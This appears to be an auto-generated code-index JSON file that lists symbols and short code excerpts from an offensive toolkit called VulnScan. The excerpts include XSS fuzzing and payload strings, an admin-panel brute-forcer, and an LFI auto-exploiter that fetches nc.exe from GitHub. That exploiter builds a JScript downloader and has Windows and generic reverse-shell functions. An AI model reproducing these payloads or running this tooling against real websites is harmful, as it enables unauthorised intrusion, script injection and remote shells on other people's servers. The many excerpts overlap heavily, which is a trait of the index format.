        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "paravalues = []  # list for storing parameter values\nCURRENTLY_OPEN_TAGS = []  # Used by HTML parser\nOPEN_EMPTY_TAG = (\n    \"\"  # to store context i.e. <input attr=$reflection> then input will be open tag\n)\nblacklist = [\n    \"html\",\n    \"body\",\n    \"br\",\n]  # These tags are normally empty thats why we are ignoring them",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "CURRENTLY_OPEN_TAGS",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "CURRENTLY_OPEN_TAGS = []  # Used by HTML parser\nOPEN_EMPTY_TAG = (\n    \"\"  # to store context i.e. <input attr=$reflection> then input will be open tag\n)\nblacklist = [\n    \"html\",\n    \"body\",\n    \"br\",\n]  # These tags are normally empty thats why we are ignoring them\n# These tags are the top priority to break out from",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "OPEN_EMPTY_TAG",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "OPEN_EMPTY_TAG = (\n    \"\"  # to store context i.e. <input attr=$reflection> then input will be open tag\n)\nblacklist = [\n    \"html\",\n    \"body\",\n    \"br\",\n]  # These tags are normally empty thats why we are ignoring them\n# These tags are the top priority to break out from\nwhitelist = [\"input\", \"textarea\"]",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "blacklist",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "blacklist = [\n    \"html\",\n    \"body\",\n    \"br\",\n]  # These tags are normally empty thats why we are ignoring them\n# These tags are the top priority to break out from\nwhitelist = [\"input\", \"textarea\"]\nNUM_REFLECTIONS = 0  # Number of reflections\nOCCURENCE_NUM = 0  # Occurence number\nOCCURENCE_PARSED = 0  # Occurence parsed by the parser",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "whitelist",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "whitelist = [\"input\", \"textarea\"]\nNUM_REFLECTIONS = 0  # Number of reflections\nOCCURENCE_NUM = 0  # Occurence number\nOCCURENCE_PARSED = 0  # Occurence parsed by the parser\noccur_number = []\noccur_location = []\ndelay = 0\ntags = [\"sVg\", \"iMg\", \"bOdY\", \"d3v\", \"deTails\"]  # HTML Tags\nevent_handlers = {  # Event handlers and the name of tags which can be used with them\n    \"oNeRror\": [\"sVg\", \"iMg\", \"viDeo\"],",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "NUM_REFLECTIONS",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "NUM_REFLECTIONS = 0  # Number of reflections\nOCCURENCE_NUM = 0  # Occurence number\nOCCURENCE_PARSED = 0  # Occurence parsed by the parser\noccur_number = []\noccur_location = []\ndelay = 0\ntags = [\"sVg\", \"iMg\", \"bOdY\", \"d3v\", \"deTails\"]  # HTML Tags\nevent_handlers = {  # Event handlers and the name of tags which can be used with them\n    \"oNeRror\": [\"sVg\", \"iMg\", \"viDeo\"],\n    \"oNloAd\": [\"sVg\", \"bOdY\"],",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "OCCURENCE_NUM",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "OCCURENCE_NUM = 0  # Occurence number\nOCCURENCE_PARSED = 0  # Occurence parsed by the parser\noccur_number = []\noccur_location = []\ndelay = 0\ntags = [\"sVg\", \"iMg\", \"bOdY\", \"d3v\", \"deTails\"]  # HTML Tags\nevent_handlers = {  # Event handlers and the name of tags which can be used with them\n    \"oNeRror\": [\"sVg\", \"iMg\", \"viDeo\"],\n    \"oNloAd\": [\"sVg\", \"bOdY\"],\n    \"oNsTart\": [\"maRQuee\"],",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "OCCURENCE_PARSED",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "OCCURENCE_PARSED = 0  # Occurence parsed by the parser\noccur_number = []\noccur_location = []\ndelay = 0\ntags = [\"sVg\", \"iMg\", \"bOdY\", \"d3v\", \"deTails\"]  # HTML Tags\nevent_handlers = {  # Event handlers and the name of tags which can be used with them\n    \"oNeRror\": [\"sVg\", \"iMg\", \"viDeo\"],\n    \"oNloAd\": [\"sVg\", \"bOdY\"],\n    \"oNsTart\": [\"maRQuee\"],\n    \"oNMoUseOver\": [\"d3v\", \"IfRame\", \"bOdY\"],",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "occur_number",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "occur_number = []\noccur_location = []\ndelay = 0\ntags = [\"sVg\", \"iMg\", \"bOdY\", \"d3v\", \"deTails\"]  # HTML Tags\nevent_handlers = {  # Event handlers and the name of tags which can be used with them\n    \"oNeRror\": [\"sVg\", \"iMg\", \"viDeo\"],\n    \"oNloAd\": [\"sVg\", \"bOdY\"],\n    \"oNsTart\": [\"maRQuee\"],\n    \"oNMoUseOver\": [\"d3v\", \"IfRame\", \"bOdY\"],\n    \"oNfoCus\": [\"d3v\", \"bOdY\"],",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "occur_location",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "occur_location = []\ndelay = 0\ntags = [\"sVg\", \"iMg\", \"bOdY\", \"d3v\", \"deTails\"]  # HTML Tags\nevent_handlers = {  # Event handlers and the name of tags which can be used with them\n    \"oNeRror\": [\"sVg\", \"iMg\", \"viDeo\"],\n    \"oNloAd\": [\"sVg\", \"bOdY\"],\n    \"oNsTart\": [\"maRQuee\"],\n    \"oNMoUseOver\": [\"d3v\", \"IfRame\", \"bOdY\"],\n    \"oNfoCus\": [\"d3v\", \"bOdY\"],\n    \"oNCliCk\": [\"d3v\", \"bOdY\"],",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "delay",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "delay = 0\ntags = [\"sVg\", \"iMg\", \"bOdY\", \"d3v\", \"deTails\"]  # HTML Tags\nevent_handlers = {  # Event handlers and the name of tags which can be used with them\n    \"oNeRror\": [\"sVg\", \"iMg\", \"viDeo\"],\n    \"oNloAd\": [\"sVg\", \"bOdY\"],\n    \"oNsTart\": [\"maRQuee\"],\n    \"oNMoUseOver\": [\"d3v\", \"IfRame\", \"bOdY\"],\n    \"oNfoCus\": [\"d3v\", \"bOdY\"],\n    \"oNCliCk\": [\"d3v\", \"bOdY\"],\n    \"oNToggLe\": [\"deTails\"],",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "tags",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "tags = [\"sVg\", \"iMg\", \"bOdY\", \"d3v\", \"deTails\"]  # HTML Tags\nevent_handlers = {  # Event handlers and the name of tags which can be used with them\n    \"oNeRror\": [\"sVg\", \"iMg\", \"viDeo\"],\n    \"oNloAd\": [\"sVg\", \"bOdY\"],\n    \"oNsTart\": [\"maRQuee\"],\n    \"oNMoUseOver\": [\"d3v\", \"IfRame\", \"bOdY\"],\n    \"oNfoCus\": [\"d3v\", \"bOdY\"],\n    \"oNCliCk\": [\"d3v\", \"bOdY\"],\n    \"oNToggLe\": [\"deTails\"],\n}",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "event_handlers",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "event_handlers = {  # Event handlers and the name of tags which can be used with them\n    \"oNeRror\": [\"sVg\", \"iMg\", \"viDeo\"],\n    \"oNloAd\": [\"sVg\", \"bOdY\"],\n    \"oNsTart\": [\"maRQuee\"],\n    \"oNMoUseOver\": [\"d3v\", \"IfRame\", \"bOdY\"],\n    \"oNfoCus\": [\"d3v\", \"bOdY\"],\n    \"oNCliCk\": [\"d3v\", \"bOdY\"],\n    \"oNToggLe\": [\"deTails\"],\n}\nfunctions = [  # JavaScript functions to get a popup",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "functions",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "functions = [  # JavaScript functions to get a popup\n    \"[8].find(confirm)\",\n    \"confirm()\",\n    \"(confirm)()\",\n    \"co\\\\u006efir\\\\u006d()\",\n    \"(prompt)``\",\n    \"a=prompt,a()\",\n]\n# \"Not so malicious\" payloads for fuzzing\nfuzzes = [",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "fuzzes",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "fuzzes = [\n    \"<z oNxXx=yyy>\",\n    \"<z xXx=yyy>\",\n    \"<z o%00nload=yyy>\",\n    \"<z oNStart=confirm()>\",\n    \"<z oNMousEDown=(((confirm)))()>\",\n    \"<z oNMousEDown=(prompt)``>\",\n    \"<EmBed sRc=//14.rs>\",\n    \"<EmBed sRc=\\/\\\\14.rs>\",\n    \"<z oNMoUseOver=yyy>\",",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "payloads = [  # Payloads for blind xss and simple bruteforcing\n    \"'\\\"</Script><Html Onmouseover=(confirm)()//\" \"<imG/sRc=l oNerrOr=(prompt)() x>\",\n    \"<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>\",\n    \"<deTails open oNToggle=confi\\\\u0072m()>\",\n    \"<img sRc=l oNerrOr=(confirm)() x>\",\n    '<svg/x=\">\"/onload=confirm()//',\n    \"<svg%0Aonload=%09((pro\\\\u006dpt))()//\",\n    \"<iMg sRc=x:confirm`` oNlOad=e\\\\u0076al(src)>\",\n    \"<sCript x>confirm``</scRipt x>\",\n    \"<Script x>prompt()</scRiPt x>\",",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "blind_params",
        "kind": 5,
        "importPath": "VulnScan.modules.X-Strike",
        "description": "VulnScan.modules.X-Strike",
        "peekOfCode": "blind_params = [\n    \"redirect\",\n    \"redir\",\n    \"url\",\n    \"link\",\n    \"goto\",\n    \"debug\",\n    \"_debug\",\n    \"test\",\n    \"get\",",
        "detail": "VulnScan.modules.X-Strike",
        "documentation": {}
    },
    {
        "label": "myThread",
        "kind": 6,
        "importPath": "VulnScan.modules.adminfinder",
        "description": "VulnScan.modules.adminfinder",
        "peekOfCode": "class myThread(Thread):\n    def __init__(self, threadID, name, q):\n        Thread.__init__(self)\n        self.threadID = threadID\n        self.name = name\n        self.q = q\n    def run(self):\n        getresponse(self.name, self.q)\nclass Timer:\n    def __enter__(self):",
        "detail": "VulnScan.modules.adminfinder",
        "documentation": {}
    },
    {
        "label": "Timer",
        "kind": 6,
        "importPath": "VulnScan.modules.adminfinder",
        "description": "VulnScan.modules.adminfinder",
        "peekOfCode": "class Timer:\n    def __enter__(self):\n        self.start = time.time()\n    def __exit__(self, *args):\n        taken = time.time() - self.start\n        seconds = int(time.strftime(\"%S\", time.gmtime(taken)))\n        minutes = int(time.strftime(\"%M\", time.gmtime(taken)))\n        hours = int(time.strftime(\"%H\", time.gmtime(taken)))\n        if minutes > 0:\n            if hours > 0:",
        "detail": "VulnScan.modules.adminfinder",
        "documentation": {}
    },
    {
        "label": "Printer",
        "kind": 6,
        "importPath": "VulnScan.modules.adminfinder",
        "description": "VulnScan.modules.adminfinder",
        "peekOfCode": "class Printer:\n    def __init__(self, data):\n        stdout.write(\"\\r\\x1b[K\" + data.__str__())\n        stdout.flush()\ndef getresponse(threadName, q):\n    for i in range(len(adminlist)):\n        queueLock.acquire()\n        if not workQueue.empty():\n            data = q.get()\n            queueLock.release()",
        "detail": "VulnScan.modules.adminfinder",
        "documentation": {}
    },
    {
        "label": "killpid",
        "kind": 2,
        "importPath": "VulnScan.modules.adminfinder",
        "description": "VulnScan.modules.adminfinder",
        "peekOfCode": "def killpid(signum=0, frame=0):\n    print(\"\\r\\x1b[K\")\n    os.kill(getpid(), 9)\nsignal(SIGINT, killpid)\nclass myThread(Thread):\n    def __init__(self, threadID, name, q):\n        Thread.__init__(self)\n        self.threadID = threadID\n        self.name = name\n        self.q = q",
        "detail": "VulnScan.modules.adminfinder",
        "documentation": {}
    },
    {
        "label": "getresponse",
        "kind": 2,
        "importPath": "VulnScan.modules.adminfinder",
        "description": "VulnScan.modules.adminfinder",
        "peekOfCode": "def getresponse(threadName, q):\n    for i in range(len(adminlist)):\n        queueLock.acquire()\n        if not workQueue.empty():\n            data = q.get()\n            queueLock.release()\n            checkg = 1\n            while checkg == 1:\n                try:\n                    connection = http.client.HTTPConnection(str(url))",
        "detail": "VulnScan.modules.adminfinder",
        "documentation": {}
    },
    {
        "label": "killpid",
        "kind": 2,
        "importPath": "VulnScan.modules.adminfinder",
        "description": "VulnScan.modules.adminfinder",
        "peekOfCode": "def killpid(signum=0, frame=0):\n    print(\"\\r\\x1b[K\")\n    kill(getpid(), 9)\nparser = ArgumentParser(prog=\"adminfinder\", usage=\"adminfinder [options]\")\nparser.add_argument(\"-u\", \"--url\", type=str, help=\"url eg. target.com\")\nparser.add_argument(\"-w\", \"--wordlist\", type=str, help=\"wordlist\")\nparser.add_argument(\"-t\", \"--threads\", type=int, help=\"number of threads\")\nparser.add_argument(\n    \"-f\", \"--follow\", action=\"store_true\", help=\"follow and resolve redirects\"\n)",
        "detail": "VulnScan.modules.adminfinder",
        "documentation": {}
    },
    {
        "label": "parser",
        "kind": 5,
        "importPath": "VulnScan.modules.adminfinder",
        "description": "VulnScan.modules.adminfinder",
        "peekOfCode": "parser = ArgumentParser(prog=\"adminfinder\", usage=\"adminfinder [options]\")\nparser.add_argument(\"-u\", \"--url\", type=str, help=\"url eg. target.com\")\nparser.add_argument(\"-w\", \"--wordlist\", type=str, help=\"wordlist\")\nparser.add_argument(\"-t\", \"--threads\", type=int, help=\"number of threads\")\nparser.add_argument(\n    \"-f\", \"--follow\", action=\"store_true\", help=\"follow and resolve redirects\"\n)\nparser.add_argument(\n    \"-b\", \"--forbidden\", action=\"store_true\", help=\"show forbidden pages\"\n)",
        "detail": "VulnScan.modules.adminfinder",
        "documentation": {}
    },
    {
        "label": "args",
        "kind": 5,
        "importPath": "VulnScan.modules.adminfinder",
        "description": "VulnScan.modules.adminfinder",
        "peekOfCode": "args = parser.parse_args()\nif len(argv) == 1:\n    parser.print_help()\n    exit()\ndomain = args.url\nurl = str(domain.strip())\nadminlist = [line.strip() for line in open(args.wordlist, \"r\")]\nqueueLock = Lock()\nworkQueue = queue.Queue(len(adminlist))\nfound = []",
        "detail": "VulnScan.modules.adminfinder",
        "documentation": {}
    },
    {
        "label": "domain",
        "kind": 5,
        "importPath": "VulnScan.modules.adminfinder",
        "description": "VulnScan.modules.adminfinder",
        "peekOfCode": "domain = args.url\nurl = str(domain.strip())\nadminlist = [line.strip() for line in open(args.wordlist, \"r\")]\nqueueLock = Lock()\nworkQueue = queue.Queue(len(adminlist))\nfound = []\nthreads = []\nexitFlag = 0\nthreadID = 1\nmaxthreads = 40",
        "detail": "VulnScan.modules.adminfinder",
        "documentation": {}
    },
    {
        "label": "url",
        "kind": 5,
        "importPath": "VulnScan.modules.adminfinder",
        "description": "VulnScan.modules.adminfinder",
        "peekOfCode": "url = str(domain.strip())\nadminlist = [line.strip() for line in open(args.wordlist, \"r\")]\nqueueLock = Lock()\nworkQueue = queue.Queue(len(adminlist))\nfound = []\nthreads = []\nexitFlag = 0\nthreadID = 1\nmaxthreads = 40\nif args.threads:",
        "detail": "VulnScan.modules.adminfinder",
        "documentation": {}
    },
    {
        "label": "adminlist",
        "kind": 5,
        "importPath": "VulnScan.modules.adminfinder",
        "description": "VulnScan.modules.adminfinder",
        "peekOfCode": "adminlist = [line.strip() for line in open(args.wordlist, \"r\")]\nqueueLock = Lock()\nworkQueue = queue.Queue(len(adminlist))\nfound = []\nthreads = []\nexitFlag = 0\nthreadID = 1\nmaxthreads = 40\nif args.threads:\n    maxthreads = args.threads",
        "detail": "VulnScan.modules.adminfinder",
        "documentation": {}
    },
    {
        "label": "queueLock",
        "kind": 5,
        "importPath": "VulnScan.modules.adminfinder",
        "description": "VulnScan.modules.adminfinder",
        "peekOfCode": "queueLock = Lock()\nworkQueue = queue.Queue(len(adminlist))\nfound = []\nthreads = []\nexitFlag = 0\nthreadID = 1\nmaxthreads = 40\nif args.threads:\n    maxthreads = args.threads\nqueueLock.acquire()",
        "detail": "VulnScan.modules.adminfinder",
        "documentation": {}
    },
    {
        "label": "workQueue",
        "kind": 5,
        "importPath": "VulnScan.modules.adminfinder",
        "description": "VulnScan.modules.adminfinder",
        "peekOfCode": "workQueue = queue.Queue(len(adminlist))\nfound = []\nthreads = []\nexitFlag = 0\nthreadID = 1\nmaxthreads = 40\nif args.threads:\n    maxthreads = args.threads\nqueueLock.acquire()\nfor word in adminlist:",
        "detail": "VulnScan.modules.adminfinder",
        "documentation": {}
    },
    {
        "label": "found",
        "kind": 5,
        "importPath": "VulnScan.modules.adminfinder",
        "description": "VulnScan.modules.adminfinder",
        "peekOfCode": "found = []\nthreads = []\nexitFlag = 0\nthreadID = 1\nmaxthreads = 40\nif args.threads:\n    maxthreads = args.threads\nqueueLock.acquire()\nfor word in adminlist:\n    workQueue.put(word)",
        "detail": "VulnScan.modules.adminfinder",
        "documentation": {}
    },
    {
        "label": "threads",
        "kind": 5,
        "importPath": "VulnScan.modules.adminfinder",
        "description": "VulnScan.modules.adminfinder",
        "peekOfCode": "threads = []\nexitFlag = 0\nthreadID = 1\nmaxthreads = 40\nif args.threads:\n    maxthreads = args.threads\nqueueLock.acquire()\nfor word in adminlist:\n    workQueue.put(word)\nqueueLock.release()",
        "detail": "VulnScan.modules.adminfinder",
        "documentation": {}
    },
    {
        "label": "exitFlag",
        "kind": 5,
        "importPath": "VulnScan.modules.adminfinder",
        "description": "VulnScan.modules.adminfinder",
        "peekOfCode": "exitFlag = 0\nthreadID = 1\nmaxthreads = 40\nif args.threads:\n    maxthreads = args.threads\nqueueLock.acquire()\nfor word in adminlist:\n    workQueue.put(word)\nqueueLock.release()\nwhile threadID <= maxthreads:",
        "detail": "VulnScan.modules.adminfinder",
        "documentation": {}
    },
    {
        "label": "threadID",
        "kind": 5,
        "importPath": "VulnScan.modules.adminfinder",
        "description": "VulnScan.modules.adminfinder",
        "peekOfCode": "threadID = 1\nmaxthreads = 40\nif args.threads:\n    maxthreads = args.threads\nqueueLock.acquire()\nfor word in adminlist:\n    workQueue.put(word)\nqueueLock.release()\nwhile threadID <= maxthreads:\n    tname = str(\"Thread-\") + str(threadID)",
        "detail": "VulnScan.modules.adminfinder",
        "documentation": {}
    },
    {
        "label": "maxthreads",
        "kind": 5,
        "importPath": "VulnScan.modules.adminfinder",
        "description": "VulnScan.modules.adminfinder",
        "peekOfCode": "maxthreads = 40\nif args.threads:\n    maxthreads = args.threads\nqueueLock.acquire()\nfor word in adminlist:\n    workQueue.put(word)\nqueueLock.release()\nwhile threadID <= maxthreads:\n    tname = str(\"Thread-\") + str(threadID)\n    thread = myThread(threadID, tname, workQueue)",
        "detail": "VulnScan.modules.adminfinder",
        "documentation": {}
    },
    {
        "label": "NoURLEncodingSession",
        "kind": 6,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "class NoURLEncodingSession(requests.Session):\n    def send(self, *a, **kw):\n        a[0].url = a[0].url.replace(urllib.parse.quote(\"<\"), \"<\")\n        a[0].url = a[0].url.replace(urllib.parse.quote(\" \"), \" \")\n        a[0].url = a[0].url.replace(urllib.parse.quote(\">\"), \">\")\n        return requests.Session.send(self, *a, **kw)\ndef printChoice(choice):\n    if \"Auto Hack\" in choice:\n        print(colored(\"\\n.:: %s ::.\\n\" % choice, \"red\"))\n    else:",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "download",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def download(file_url, local_filename):\n    web_file = urllib.request.urlopen(file_url)\n    local_file = open(local_filename, \"w\")\n    local_file.write(web_file.read())\n    web_file.close()\n    local_file.close()\nnetcat_url = \"https://github.com/D35m0nd142/LFISuite/raw/master/nc.exe\"\nLFS_V3n0M_VERSION = \"1.1\"  # DO NOT MODIFY THIS FOR ANY REASON!!\n# --------- Auto-Hack Global Variables ----------#\nahactive = False",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "initWindowsReverse",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def initWindowsReverse():\n    global wget_filename\n    global wget_js_content\n    global nc_filename\n    if len(wget_filename) > 0 and len(nc_filename) > 0:\n        return False\n    wget_num = generateRandom()[11:]\n    nc_num = generateRandom()[11:]\n    wget_js_content = (\n        \"\"\"var WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");WinHttpReq.Open(\"GET\", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();BinStream = new ActiveXObject(\"ADODB.Stream\");BinStream.Type = 1;BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile(\"nc_%s.exe\");\"\"\"",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "windows_reverse_shell",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def windows_reverse_shell():\n    global reverseConn\n    if \"?\" in reverseConn:\n        print(\n            colored(\n                \"[WARNING] Make sure to have your netcat listening ('nc -lvp port') before going ahead.\",\n                \"red\",\n            )\n        )\n        time.sleep(2)",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "generic_reverse_shell",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def generic_reverse_shell():\n    global reverseConn\n    if \"?\" in reverseConn:\n        print(\n            colored(\n                \"[WARNING] Make sure to have your netcat listening ('nc -lvp port') before going ahead.\",\n                \"red\",\n            )\n        )\n        time.sleep(2)",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "checkIfReverseShell",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def checkIfReverseShell(cmd):\n    if cmd == \"reverse shell\" or cmd == \"reverseshell\":\n        return True\n    return False\ndef checkIfWindows(path):\n    if victimOs == \"Windows\" or (len(path) > 0 and \"\\windows\\system32\" in path.lower()):\n        print(colored(\"\\n[+] OS: Windows\\n\", \"white\"))\n        return True\n    return False\n# ----------------------------------------------------#",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "checkIfWindows",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def checkIfWindows(path):\n    if victimOs == \"Windows\" or (len(path) > 0 and \"\\windows\\system32\" in path.lower()):\n        print(colored(\"\\n[+] OS: Windows\\n\", \"white\"))\n        return True\n    return False\n# ----------------------------------------------------#\n# -------------------------------------------------------------------Generic------------------------------------------------------------#\ngen_headers = {\n    \"User-Agent\": \"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\",\n    \"Accept-Language\": \"en-US;\",",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "banner",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def banner():\n    print(\n        \"/*-----------------------------LFI Scan------------------------------------*\\\\\"\n    )\n    print(\n        \"| Local File Inclusion Automatic Exploiter and Scanner + Reverse Shell      |\"\n    )\n    print(\n        \"| Modules: AUTO-HACK, /self/environ, /self/fd, phpinfo, php://input,        |\"\n    )",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "printChoice",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def printChoice(choice):\n    if \"Auto Hack\" in choice:\n        print(colored(\"\\n.:: %s ::.\\n\" % choice, \"red\"))\n    else:\n        print(colored(\"\\n.:: %s Injection ::.\\n\" % choice, \"red\"))\ndef extractWebsiteFromUrl(url):\n    # Pre: url contains http:// or https:// declaration\n    splits = url.split(\"/\")\n    return \"%s//%s\" % (splits[0], splits[2])\ndef getHTTPWebsite(ourl):  # http://127.0.0.1/dvwa/test.php --> http://127.0.0.1",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "extractWebsiteFromUrl",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def extractWebsiteFromUrl(url):\n    # Pre: url contains http:// or https:// declaration\n    splits = url.split(\"/\")\n    return \"%s//%s\" % (splits[0], splits[2])\ndef getHTTPWebsite(ourl):  # http://127.0.0.1/dvwa/test.php --> http://127.0.0.1\n    split = ourl.split(\"/\")\n    return \"%s//%s\" % (split[0], split[2])\ndef removeHttpFromWebsite(website):\n    if \"http://\" in website or \"https://\" in website:\n        splits = website.split(\"/\")",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "getHTTPWebsite",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def getHTTPWebsite(ourl):  # http://127.0.0.1/dvwa/test.php --> http://127.0.0.1\n    split = ourl.split(\"/\")\n    return \"%s//%s\" % (split[0], split[2])\ndef removeHttpFromWebsite(website):\n    if \"http://\" in website or \"https://\" in website:\n        splits = website.split(\"/\")\n        return splits[2]\n    return website\ndef checkHttp(url):\n    if \"http://\" not in url and \"https://\" not in url:",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "removeHttpFromWebsite",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def removeHttpFromWebsite(website):\n    if \"http://\" in website or \"https://\" in website:\n        splits = website.split(\"/\")\n        return splits[2]\n    return website\ndef checkHttp(url):\n    if \"http://\" not in url and \"https://\" not in url:\n        return \"http://%s\" % url\n    return url\ndef isUnknown(par):",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "checkHttp",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def checkHttp(url):\n    if \"http://\" not in url and \"https://\" not in url:\n        return \"http://%s\" % url\n    return url\ndef isUnknown(par):\n    if len(par) < 2 or len(par) > 120:\n        return \"?\"\n    return par\ndef SubstrFind(resp, toFind):\n    if len(toFind) > len(resp):",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "isUnknown",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def isUnknown(par):\n    if len(par) < 2 or len(par) > 120:\n        return \"?\"\n    return par\ndef SubstrFind(resp, toFind):\n    if len(toFind) > len(resp):\n        return []\n    found = False\n    indexes = []\n    for x in range(0, (len(resp) - len(toFind)) + 1):",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "SubstrFind",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def SubstrFind(resp, toFind):\n    if len(toFind) > len(resp):\n        return []\n    found = False\n    indexes = []\n    for x in range(0, (len(resp) - len(toFind)) + 1):\n        if ord(resp[x]) == ord(toFind[0]):\n            found = True\n            for i in range(0, len(toFind)):\n                if ord(resp[x + i]) != ord(toFind[i]):",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "extractPathFromPaths",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def extractPathFromPaths():\n    global ahpaths\n    if len(ahpaths) == 0:\n        return \"<NOT APPLICABLE>\"\n    first = ahpaths[0]\n    equals = SubstrFind(first, \"=\")\n    index = equals[len(equals) - 1] + 1\n    nfirst = first[index:]\n    tmp = \"\"\n    for c in nfirst:",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "cutURLToLastEqual",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
